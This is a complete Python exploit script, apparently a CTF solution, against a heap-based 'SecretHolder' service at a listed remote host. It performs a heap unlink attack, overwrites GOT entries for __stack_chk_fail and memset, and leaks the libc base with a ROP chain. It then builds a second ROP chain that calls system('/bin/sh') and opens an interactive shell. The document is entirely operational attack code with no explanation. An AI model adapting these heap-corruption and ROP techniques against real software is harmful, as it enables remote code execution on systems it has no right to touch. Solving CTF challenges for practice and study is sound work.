#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'52.68.31.117','port':5566})
env.set_item('libc',    local   = 'D:\CTF\FILES\libc-2.19.so_amd64_local', \
                        remote  = 'libc.so.6_375198810bb39e6593a968fcbcf6556789026743')
env.select()

binf = ELF('SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8', rop=True)
libc = ELF(env.libc)

addr_got_stack_fail = binf.got('__stack_chk_fail')
addr_got_memset     = binf.got('memset')
addr_got_main       = binf.got('__libc_start_main')

addr_plt_puts       = binf.plt('puts')
addr_plt_alarm      = binf.plt('alarm')
addr_plt_exit       = binf.plt('exit')

addr_ret            = binf.ropgadget('ret')
addr_pop_rdi        = binf.ropgadget('pop rdi', 'ret')

addr_main           = 0x400cc2
addr_read_lot       = 0x4009f9
addr_ptr_small      = 0x6020b0

size_num = {'small':1, 'big':2, 'huge':3}

#==========
def attack(cmn):
    shd = SecretHolder(cmn)
    
    proc('Pahse1 : Unlink Attack')
    
    shd.keep('huge', '')
    shd.wipe('huge')
    shd.keep('small', '')
    shd.wipe('small')
    shd.keep('huge', '')                        # buf_huge == buf_small
    shd.wipe('small')

    exploit_st1  = '\x00'*0x28
    exploit_st1 += pack_64(0x30 | PREV_INUSE)
    exploit_st1 += '\x00'*0x28
    exploit_st1 += pack_64(0x81fa0 | PREV_INUSE)
    
    shd.keep('small', '')
    shd.keep('big', '')
    shd.renew('huge', exploit_st1)
    shd.wipe('small')
    shd.wipe('big')

    exploit_st2  = '\x00'*0x30
    # small (shift small chunk behind 16 bytes)
    exploit_st2 += pack_64(0x0)                 # prev_size
    exploit_st2 += pack_64(0xfa0 | PREV_INUSE)  # size
    exploit_st2 += pack_64(addr_ptr_small-0x18) # fd
    exploit_st2 += pack_64(addr_ptr_small-0x10) # bk
    exploit_st2 += '\x00'*0xf80
    # big
    exploit_st2 += pack_64(0xfa0)               # prev_size
    exploit_st2 += pack_64(0xfb0 & ~PREV_INUSE) # size

    shd.keep('small', '')
    shd.keep('big', '')
    shd.renew('huge', exploit_st2)
    shd.wipe('big')                             # unlink attack (addr_ptr_small <- addr_ptr_small-0x18)

    #==========

    proc('Pahse2 : GOT overwrite to ROP')
    
    payload_st1  = '\x00'*0x8
    payload_st1 += pack_64(addr_got_memset)     # buf_big
    payload_st1 += pack_64(0)                   # buf_huge (not used)
    payload_st1 += pack_64(addr_got_stack_fail) # buf_small
    payload_st1 += pack_32(1)*3
    shd.renew('small', payload_st1)

    shd.renew('small', pack_64(addr_ret))       # addr_got_stack_fail   <- addr_ret
    shd.renew('big', pack_64(addr_read_lot))    # addr_got_memset       <- addr_read_lot

    #==========
    
    proc('Pahse3 : Leak libc base-address')
    
    payload_st2  = '\x00'*0x18
    payload_st2 += pack_64(addr_pop_rdi)
    payload_st2 += pack_64(addr_got_main)
    payload_st2 += pack_64(addr_plt_puts)
    payload_st2 += pack_64(addr_main)

    cmn.read_until('3. Renew secret\n')
    cmn.send(payload_st2)

    addr_libc_main = cmn.read_until(contain=False)
    addr_libc_main = unpack_64(addr_libc_main+'\x00'*(8-len(addr_libc_main)))
    info('addr_libc_main    = 0x%08x' % addr_libc_main)
    
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_system    = libc.function('system')
    addr_libc_str_sh    = libc.search('/bin/sh')

    #==========

    proc('Pahse4 : Execute /bin/sh')
    
    payload_st3  = '\x00'*0x18
    payload_st3 += pack_64(addr_pop_rdi)
    payload_st3 += pack_64(0)
    payload_st3 += pack_64(addr_plt_alarm)
    
    payload_st3 += pack_64(addr_pop_rdi)
    payload_st3 += pack_64(addr_libc_str_sh)
    payload_st3 += pack_64(addr_libc_system)

    payload_st3 += pack_64(addr_plt_exit)

    cmn.read_until('3. Renew secret\n')
    cmn.send(payload_st3)

#========== 

class SecretHolder:
    def __init__(self, cmn):
        self._read_until = cmn.read_until
        self._sendln     = cmn.sendln
        self._send       = cmn.send
        
    def keep(self, size, secret):
        self._read_until('3. Renew secret\n')
        self._sendln('1')
        self._read_until('3. Huge secret\n')
        self._sendln(str(size_num[size]))
        
        self._read_until('Tell me your secret: \n')
        self._send(secret if secret else '\x00')

    def wipe(self, size):
        self._read_until('3. Renew secret\n')
        self._sendln('2')
        self._read_until('3. Huge secret\n')
        self._sendln(str(size_num[size]))

    def renew(self, size, secret):
        self._read_until('3. Renew secret\n')
        self._sendln('3')
        self._read_until('3. Huge secret\n')
        self._sendln(str(size_num[size]))
        
        self._read_until('Tell me your secret: \n')
        self._send(secret if secret else '\x00')

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
